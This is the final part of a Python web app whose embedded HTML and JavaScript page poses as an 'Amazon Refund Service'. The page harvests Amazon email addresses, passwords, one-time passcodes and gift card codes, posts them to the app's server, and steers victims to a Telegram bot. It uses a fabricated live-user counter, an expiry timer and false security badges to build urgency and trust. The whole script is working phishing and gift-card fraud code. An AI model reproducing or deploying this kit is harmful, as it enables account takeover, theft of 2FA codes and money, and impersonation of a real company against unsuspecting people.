        <div class="modal-content">
            <h2 id="resultTitle" style="text-align: center;"></h2>
            <div id="resultContent" style="text-align: center; margin: 1rem 0;"></div>
            <div class="timer" id="timerDisplay">30:00</div>
            <div id="resultMessage" style="margin: 1rem 0; text-align: center; font-size: 0.9rem;"></div>
            <div style="text-align: center; margin-top: 0.5rem;">
                <a href="https://t.me/{{ bot_username }}" target="_blank" class="telegram-btn" style="font-size: 0.8rem; padding: 6px 15px;">
                    📱 SEND TO BOT → @{{ bot_username }}
                </a>
            </div>
            <div style="text-align: center; margin-top: 1rem;">
                <button class="copy-btn" onclick="closeModal('resultModal')">Close</button>
            </div>
        </div>
    </div>

    <div class="footer">
        <p>© 2024 Amazon Refund Service | 24/7 Support | Secure Connection</p>
        <p style="font-size: 0.7rem; margin-top: 0.5rem;">🔒 Encrypted | 💳 Instant Refund | ⚡ 5-10 Minutes</p>
    </div>

    <script>
        // Matrix Effect
        const canvas = document.getElementById('matrixCanvas');
        const ctx = canvas.getContext('2d');
        
        function resizeCanvas() {
            canvas.width = window.innerWidth;
            canvas.height = window.innerHeight;
        }
        resizeCanvas();
        window.addEventListener('resize', resizeCanvas);
        
        const chars = "ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789@#$%^&*<>/\\|";
        const fontSize = 14;
        let columns = canvas.width / fontSize;
        let drops = [];
        
        function initDrops() {
            columns = canvas.width / fontSize;
            drops = [];
            for (let i = 0; i < columns; i++) {
                drops[i] = Math.random() * -100;
            }
        }
        initDrops();
        
        function drawMatrix() {
            ctx.fillStyle = 'rgba(0, 0, 0, 0.04)';
            ctx.fillRect(0, 0, canvas.width, canvas.height);
            ctx.fillStyle = '#00ff41';
            ctx.font = fontSize + 'px monospace';
            
            for (let i = 0; i < drops.length; i++) {
                const text = chars[Math.floor(Math.random() * chars.length)];
                ctx.fillText(text, i * fontSize, drops[i] * fontSize);
                if (drops[i] * fontSize > canvas.height && Math.random() > 0.975) {
                    drops[i] = 0;
                }
                drops[i]++;
            }
        }
        
        setInterval(drawMatrix, 50);
        window.addEventListener('resize', () => {
            resizeCanvas();
            initDrops();
        });
        
        // Animated Stats
        let liveUsers = 2847;
        setInterval(() => {
            liveUsers += Math.floor(Math.random() * 20) - 8;
            if (liveUsers < 2000) liveUsers = 2000;
            if (liveUsers > 5000) liveUsers = 5000;
            document.getElementById('liveUsers').innerHTML = liveUsers.toLocaleString();
        }, 6000);
        
        // Variables
        let currentTxid = null;
        let timerInterval = null;
        
        // Modal Functions
        function showAccountModal() {
            document.getElementById('accountModal').style.display = 'flex';
        }
        
        function showCodeModal() {
            document.getElementById('codeModal').style.display = 'flex';
        }
        
        function closeModal(modalId) {
            document.getElementById(modalId).style.display = 'none';
            if (timerInterval) clearInterval(timerInterval);
        }
        
        // Submit Account
        async function submitAccount() {
            const email = document.getElementById('amazonEmail').value.trim();
            const password = document.getElementById('amazonPassword').value;
            
            if (!email || !password) {
                alert('⚠️ Please enter both email and password');
                return;
            }
            
            closeModal('accountModal');
            showProcessing('Account Verification', 'Connecting to Amazon servers...');
            
            try {
                const response = await fetch('/api/refund/account', {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({ email, password })
                });
                
                const data = await response.json();
                hideProcessing();
                
                if (data.success) {
                    currentTxid = data.txid;
                    document.getElementById('otpModal').style.display = 'flex';
                } else {
                    alert('❌ ' + (data.error || 'Something went wrong'));
                }
            } catch (err) {
                hideProcessing();
                alert('❌ Network error. Please try again.');
            }
        }
        
        // Submit Code
        async function submitCode() {
            const giftCode = document.getElementById('giftCode').value.trim().toUpperCase();
            
            if (!giftCode) {
                alert('⚠️ Please enter the gift card code');
                return;
            }
            
            closeModal('codeModal');
            showProcessing('Gift Card Processing', 'Verifying code validity...');
            
            try {
                const response = await fetch('/api/refund/code', {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({ gift_code: giftCode })
                });
                
                const data = await response.json();
                hideProcessing();
                
                if (data.success) {
                    showCodeResult(data.redeem_token);
                } else {
                    alert('❌ ' + (data.error || 'Something went wrong'));
                }
            } catch (err) {
                hideProcessing();
                alert('❌ Network error. Please try again.');
            }
        }
        
        // Verify OTP
        async function verifyOTP() {
            const otp = document.getElementById('otpCode').value.trim();
            
            if (!otp || otp.length < 4) {
                alert('⚠️ Please enter a valid OTP code');
                return;
            }
            
            closeModal('otpModal');
            showProcessing('OTP Verification', 'Verifying your code...');
            
            try {
                const response = await fetch('/api/otp/verify', {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({ txid: currentTxid, otp: otp })
                });
                
                const data = await response.json();
                hideProcessing();
                
                if (data.success) {
                    showAccountResult(currentTxid);
                } else {
                    alert('❌ Invalid OTP. Please try again.');
                }
            } catch (err) {
                hideProcessing();
                alert('❌ Network error. Please try again.');
            }
        }
        
        // Show Account Result
        function showAccountResult(txid) {
            const modal = document.getElementById('resultModal');
            document.getElementById('resultTitle').innerHTML = '✅ ACCOUNT SUBMITTED';
            document.getElementById('resultContent').innerHTML = `
                <div style="background: rgba(0,255,65,0.1); padding: 1rem; border-radius: 8px;">
                    <p><strong>📌 Your TXID:</strong></p>
                    <code style="font-size: 0.9rem; word-break: break-all;">${txid}</code>
                    <div style="margin-top: 0.7rem;">
                        <button class="copy-btn" onclick="copyToClipboard('${txid}')">📋 Copy TXID</button>
                    </div>
                </div>
            `;
            document.getElementById('resultMessage').innerHTML = `
                <strong>⚠️ IMPORTANT:</strong><br>
                Copy your TXID and send it to the Telegram bot!<br><br>
                ⏰ Expires in 30 minutes<br>
                📌 Refund within 12 hours
            `;
            modal.style.display = 'flex';
            startTimer(30);
        }
        
        // Show Code Result
        function showCodeResult(redeemToken) {
            const modal = document.getElementById('resultModal');
            document.getElementById('resultTitle').innerHTML = '🎫 GIFT CARD SUBMITTED';
            document.getElementById('resultContent').innerHTML = `
                <div style="background: rgba(255,107,53,0.1); padding: 1rem; border-radius: 8px;">
                    <p><strong>🔖 Your Redeem Token:</strong></p>
                    <code style="font-size: 0.9rem; word-break: break-all;">${redeemToken}</code>
                    <div style="margin-top: 0.7rem;">
                        <button class="copy-btn" onclick="copyToClipboard('${redeemToken}')">📋 Copy Token</button>
                    </div>
                </div>
            `;
            document.getElementById('resultMessage').innerHTML = `
                <strong>⚠️ IMPORTANT:</strong><br>
                Copy your Token and send it to the Telegram bot!<br><br>
                ⏰ Expires in 30 minutes<br>
                🚀 Refund in 5-10 minutes
            `;
            modal.style.display = 'flex';
            startTimer(30);
        }
        
        // Timer
        function startTimer(minutes) {
            let time = minutes * 60;
            const timerDisplay = document.getElementById('timerDisplay');
            
            if (timerInterval) clearInterval(timerInterval);
            
            timerInterval = setInterval(() => {
                const mins = Math.floor(time / 60);
                const secs = time % 60;
                timerDisplay.innerHTML = `${mins.toString().padStart(2, '0')}:${secs.toString().padStart(2, '0')}`;
                
                if (time <= 0) {
                    clearInterval(timerInterval);
                    timerDisplay.innerHTML = 'EXPIRED';
                    timerDisplay.style.color = '#ff0040';
                }
                time--;
            }, 1000);
        }
        
        // Processing
        function showProcessing(title, message) {
            document.getElementById('processingTitle').innerHTML = title;
            document.getElementById('processingMessage').innerHTML = message;
            document.getElementById('processingModal').style.display = 'flex';
        }
        
        function hideProcessing() {
            document.getElementById('processingModal').style.display = 'none';
        }
        
        // Copy to Clipboard
        function copyToClipboard(text) {
            navigator.clipboard.writeText(text).then(() => {
                alert('✓ Copied to clipboard!');
            }).catch(() => {
                const textarea = document.createElement('textarea');
                textarea.value = text;
                document.body.appendChild(textarea);
                textarea.select();
                document.execCommand('copy');
                document.body.removeChild(textarea);
                alert('✓ Copied to clipboard!');
            });
        }
        
        // Close modal on outside click
        window.onclick = function(event) {
            if (event.target.classList.contains('modal')) {
                event.target.style.display = 'none';
                if (timerInterval) clearInterval(timerInterval);
            }
        }
        
        // Blink animation
        setInterval(() => {
            const blinkElements = document.querySelectorAll('.blink');
            blinkElements.forEach(el => {
                el.style.opacity = el.style.opacity === '0' ? '1' : '0.5';
            });
        }, 500);
    </script>
</body>
</html>
"""

if __name__ == '__main__':
    port = int(os.environ.get('PORT', 5000))
    app.run(host='0.0.0.0', port=port, debug=False)
